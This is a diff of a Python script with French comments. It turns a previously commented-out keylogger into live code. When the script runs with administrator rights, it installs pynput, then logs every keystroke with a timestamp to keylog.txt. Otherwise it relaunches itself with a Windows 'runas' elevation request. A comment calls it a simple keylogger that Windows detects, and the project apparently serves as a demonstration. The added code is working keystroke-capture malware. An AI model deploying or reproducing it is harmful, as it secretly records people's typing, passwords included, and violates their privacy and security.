@@ -106,18 +106,18 @@ if is_admin():
     #Un simple keylogger qui est détécté par Windows ( afin d'éviter un immense code dédié )
 
     #Installation du module pynput
-    # os.system('python -m pip install pynput')
+    os.system('python -m pip install pynput')
 
-    # from pynput.keyboard import Key, Listener
-    # import logging
+    from pynput.keyboard import Key, Listener
+    import logging
     
-    # logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
     
-    # def on_press(key):
-    #     logging.info(str(key))
+    def on_press(key):
+        logging.info(str(key))
     
-    # with Listener(on_press=on_press) as listener :
-    #     listener.join()
+    with Listener(on_press=on_press) as listener :
+        listener.join()
 
 else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
